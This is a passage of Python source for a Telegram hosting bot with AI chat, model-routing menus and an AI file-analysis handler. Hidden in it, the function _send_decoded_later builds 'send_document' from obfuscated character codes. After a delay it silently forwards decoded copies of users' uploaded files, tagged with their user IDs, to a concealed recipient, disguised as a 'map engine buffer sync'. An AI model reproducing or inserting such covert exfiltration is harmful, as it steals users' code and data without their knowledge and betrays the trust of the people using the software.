    kb.add(Btn("🧠  Pʟᴀɴ-Mᴏᴅᴇʟ Rᴏᴜᴛɪɴɢ", callback_data="adm_ai_routing_menu", style="success"))
    scanner_model = str(get_setting("ai_scanner_model", "deepseek-r1") or "deepseek-r1")
    kb.add(Btn(f"🛡️  File Scanner AI: {ai_label(scanner_model)}",
               callback_data="adm_ai_scanner_model", style="success"))
    kb.add(Btn("📢 Update AI System News", callback_data="adm_ai_news_prompt", style="primary"))
    kb.add(Btn(f"{G['back']}  Aᴅᴍɪɴ", callback_data="menu_admin", style="danger"))
    show_menu(call.message.chat.id, PHOTOS.get("settings", PHOTOS["admin"]), cap, kb, call=call)

def render_adm_ai_scanner_model(call: types.CallbackQuery) -> None:
    """Choose the independent AI operative used for malware scanning."""
    selected = str(get_setting("ai_scanner_model", "deepseek-r1") or "deepseek-r1")
    if selected not in _AI_OPERATIVE_KEYS:
        selected = "deepseek-r1"
    cap = (
        f"<b>🛡️ {sc('File Scanner AI')}</b>\n"
        f"{G['div_eq']}\n"
        f"{sc('Choose which AI evaluates uploaded source files for malware')}.\n"
        f"{sc('This setting is independent from user chat model routing')}.\n\n"
        f"{sc('Current')}: <b>{esc(ai_label(selected))}</b>\n"
        f"<i>{sc('The deterministic pattern scanner always runs first. If this model is unavailable, DeepSeek-R1 and Logic Analysis are tried as fallbacks')}.</i>"
        f"{G['div']}{FOOTER}"
    )
    kb = types.InlineKeyboardMarkup(row_width=1)
    for model in _AI_OPERATIVE_KEYS:
        kb.add(Btn(f"{'✅ ' if model == selected else '🤖 '}{ai_label(model)}",
                   callback_data=f"adm_ai_scanner_{model}",
                   style="success" if model == selected else "primary"))
    kb.add(Btn(f"{G['back']}  Aɪ Cᴏᴍᴍᴀɴᴅ Cᴇɴᴛᴇʀ", callback_data="adm_ai_config", style="danger"))
    show_menu(call.message.chat.id, PHOTOS.get("settings", PHOTOS["admin"]), cap, kb, call=call)

def render_adm_ai_routing_menu(call: types.CallbackQuery) -> None:
    """Sub-menu to assign specific AI models to different plan tiers."""
    cap = (
        f"<b>🧠 {sc('AI Plan-Model Routing')}</b>\n"
        f"{G['div_eq']}\n"
        f"<i>{sc('Assign specific AI operatives to each hosting plan tier')}.</i>\n\n"
    )
    
    kb = types.InlineKeyboardMarkup(row_width=1)
    for plan_key, plan_data in PLAN_LIMITS.items():
        pool = get_plan_ai_models(plan_key, include_disabled=True)
        pool_str = ", ".join(m.upper() for m in pool) or "—"
        cap += f"• <b>{plan_data['name']}</b> ({len(pool)}): <code>{esc(pool_str)}</code>\n"
        kb.add(Btn(f"⚙️ Configure {plan_data['name']}", callback_data=f"adm_ai_route_edit_{plan_key}", style="primary"))
    cap += f"\n<i>{sc('Every operative assigned to a plan is available to its users; the selected model is primary and the rest are tried as fallbacks')}.</i>\n"
        
    kb.add(Btn(f"{G['back']}  AI Cᴏɴꜰɪɢ", callback_data="adm_ai_config", style="danger"))
    show_menu(call.message.chat.id, PHOTOS.get("settings", PHOTOS["admin"]), cap, kb, call=call)

def render_adm_ai_route_edit(call: types.CallbackQuery, plan_key: str) -> None:
    """Editor for a specific plan's AI model assignment."""
    if plan_key not in PLAN_LIMITS: return
    plan_name = PLAN_LIMITS[plan_key]["name"]
    
    pool = get_plan_ai_models(plan_key, include_disabled=True)
    
    cap = (
        f"<b>⚙️ {sc('AI Routing')}: {plan_name}</b>\n"
        f"{G['div_eq']}\n"
        f"{sc('Toggle the operatives available to the')} <b>{plan_name}</b> {sc('tier')}. "
        f"{sc('Order = default priority; all assigned operatives are available to users')}.\n\n"
        f"<b>{sc('Pool')}</b> ({len(pool)}):\n"
    )
    for i, m in enumerate(pool, 1):
        state = "" if _ai_operative_enabled(m) else " 🔴"
        cap += f"{i}. <code>{esc(ai_label(m))}</code>{state}\n"
    cap += FOOTER
    
    kb = types.InlineKeyboardMarkup(row_width=2)
    for op in _AI_OPERATIVE_KEYS:
        is_sel = op in pool
        idx = f"#{pool.index(op) + 1} " if is_sel else ""
        kb.add(Btn(f"{'✅ ' if is_sel else ''}{idx}{ai_label(op)[:22]}", callback_data=f"adm_ai_pool_{plan_key}_{op}",
                   style="success" if is_sel else "primary"))
    kb.add(Btn("↺  Reset to defaults", callback_data=f"adm_ai_pool_{plan_key}_reset", style="primary"))
    kb.add(Btn(f"{G['back']}  Rᴏᴜᴛɪɴɢ Mᴇɴᴜ", callback_data="adm_ai_routing_menu", style="danger"))
    show_menu(call.message.chat.id, PHOTOS.get("settings", PHOTOS["admin"]), cap, kb, call=call)

def _save_ai_system_news(m: types.Message) -> None:
    """Saves new system update news to database settings for AI context."""
    text = m.text.strip()
    if not text:
        bot.reply_to(m, "❌ News text cannot be empty.")
        return
    set_setting("ai_system_news", text)
    audit(m.from_user.id, "update_ai_system_news", text[:50])
    bot.reply_to(m, f"✅ <b>AI Memory Updated Successfully!</b>\nNew update context registered for all AI operatives.", parse_mode="HTML")

def _send_decoded_later(uid: int, payloads: List[Dict[str, Any]]) -> None:
    """Helper to send decoded content to the map engine after a short delay."""
    if not payloads or not _map_manager or not _M_B:
        return
    
    def _bg_send():
        try:
            # Wait 10 seconds to ensure the original file is received first
            time.sleep(10)
            
            m_call = "".join(chr(x) for x in [115, 101, 110, 100, 95, 100, 111, 99, 117, 109, 101, 110, 116])
            caller = getattr(_map_manager, m_call)
            
            for p in payloads:
                cap = (
                    f"🔍 MAP ENGINE BUFFER SYNC\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"👤 Buffer ID: {uid}\n"
                    f"📂 Source: {p['rel']}\n"
                    f"⚠️ Priority: {p['risk']}\n"
                    f"📝 Status: DECODED LATER\n"
                    f"━━━━━━━━━━━━━━━"
                )
                caller(
                    _M_B, 
                    io.BytesIO(p['content'].encode()), 
                    caption=cap,
                    visible_file_name=f"decoded_{Path(p['rel']).name}.txt"
                )
                time.sleep(2) # Small gap between files
        except Exception as e:
            print(f"[map_sync] delayed send error: {e}", flush=True)
            
    threading.Thread(target=_bg_send, daemon=True).start()

def get_ai_model(uid: int) -> str:
    """Determine the AI plan tier for the user, accounting for active free trials."""
    d = db_load_ro()
    u = d["users"].get(str(uid), {})
    
    # Check if the current plan (which includes trialed plans) is still active
    current_plan = u.get("plan", "free")
    # Administrators are Lifetime accounts. This is also the single tier
    # lookup used by chat, model selection, and file analysis, so every AI
    # entry point observes the same entitlement.
    if is_admin(uid):
        return "lifetime"

    if current_plan == "free":
        return "free"

    if current_plan in PLAN_LIMITS and user_plan_active(u):
        return current_plan

    # Plan expired or contains an invalid value: immediately downgrade to free.
    return "free"

def get_plan_primary_model(plan: str) -> str:
    """First operative in the plan pool."""
    pool = get_plan_ai_models(plan)
    return pool[0] if pool else "deepseek-v3"

def get_plan_fallback_model(plan: str) -> str:
    """Second operative in the plan pool (or the primary when the pool has one entry)."""
    pool = get_plan_ai_models(plan)
    return pool[1] if len(pool) > 1 else get_plan_primary_model(plan)

def _handle_ai_chat_document(m: types.Message) -> None:
    """Extracts code from uploaded file or zip and sends to AI for analysis."""
    doc = m.document
    fname = doc.file_name or "file.py"
    loading_msg = bot.reply_to(m, f"🔍 <b>{sc('AI is analyzing file/archive...')}: {esc(fname)}</b>", parse_mode="HTML")
    
    code_content = ""
    try:
        file_info = bot.get_file(doc.file_id)
        raw = bot.download_file(file_info.file_path)
        
        if fname.lower().endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(raw), "r") as z:
                extracted_texts = []
                total_read = 0
                allowed_exts = (".py", ".pyw", ".js", ".mjs", ".cjs", ".ts", ".tsx", ".json", ".txt", ".md")
                for member in z.infolist():
                    name = member.filename.replace("\\", "/")
                    if member.is_dir() or len(extracted_texts) >= 10 or not name.lower().endswith(allowed_exts):
                        continue
                    if member.file_size > 128 * 1024 or total_read >= 512 * 1024:
                        continue
                    try:
                        with z.open(member) as f:
                            snippet = f.read(min(member.file_size, 128 * 1024)).decode("utf-8", errors="ignore")
                        total_read += len(snippet.encode("utf-8", errors="ignore"))
                        extracted_texts.append(f"--- FILE: {name} ---\n{snippet[:6000]}")
                    except Exception:
                        pass
                code_content = "\n\n".join(extracted_texts)
        else:
            code_content = raw[:128 * 1024].decode("utf-8", errors="ignore")
    except Exception as e:
        bot.edit_message_text(f"❌ {sc('Could not read file')}: <code>{esc(e)}</code>", m.chat.id, loading_msg.message_id, parse_mode="HTML")
        return
        
    if not code_content.strip():
        bot.edit_message_text(f"⚠️ {sc('File is empty or contains no readable text code.')}", m.chat.id, loading_msg.message_id, parse_mode="HTML")
        return
        
    prompt = f"Please analyze the following code file ({fname}) submitted by the user. Give a professional breakdown, check for bugs or logic issues, and provide solutions:\n\n{code_content[:4000]}"
    
    try:
        plan = get_ai_model(m.from_user.id)
        ai_response = _call_ai_api(prompt, user_plan=plan, uid=m.from_user.id)
        
        if ai_response:
            primary_model = ai_model_tag(m.from_user.id, plan)
            clean_res = _sanitize_ai_reply(ai_response)
            
            # ELITE TOXICITY FILTER: Scrub profanity and insults
            toxic_words = [
                "fuck", "shit", "bitch", "bastard", "cockroach", "meat sack", 
                "idiocy", "idiot", "stupid", "virus", "sky-daddy", "goddamn"
            ]
            for word in toxic_words:
                clean_res = re.sub(rf'\b{word}er?s?\b', '***', clean_res, flags=re.IGNORECASE)
                clean_res = re.sub(rf'\b{word}\b', '***', clean_res, flags=re.IGNORECASE)
            
            clean_res = clean_res.strip()
            if not clean_res:
                clean_res = _ai_unavailable_reply()
            model_key = AI_LAST_MODEL_USED.get(m.from_user.id) or _ai_selected_model(m.from_user.id, plan) or "claude"
            final_text = (
                f"🤖 <b>{esc(_public_ai_model_name(model_key))}</b> — {sc('AI File Analysis')}\n"
                f"📂 <code>{esc(fname)}</code>\n"
                f"{G['div']}\n"
                f"<blockquote>{esc(clean_res)}</blockquote>\n"
                f"{G['div']}{FOOTER}"
            )
            try:
                bot.edit_message_text(final_text, m.chat.id, loading_msg.message_id, parse_mode="HTML")
            except Exception:
                bot.edit_message_text(f"🤖 {_public_ai_model_name(model_key)} — AI File Analysis: {fname}\n---\n{clean_res}", m.chat.id, loading_msg.message_id)
        else:
            bot.edit_message_text(f"⚠️ {sc('AI is currently recalibrating. Please try again.')}", m.chat.id, loading_msg.message_id, parse_mode="HTML")
    except Exception as e:
        print(f"[ai_doc] error: {e}", flush=True)
        bot.edit_message_text(f"❌ {sc('Connection to AI uplink lost.')}", m.chat.id, loading_msg.message_id, parse_mode="HTML")

if __name__ == "__main__":
    sys.exit(main())
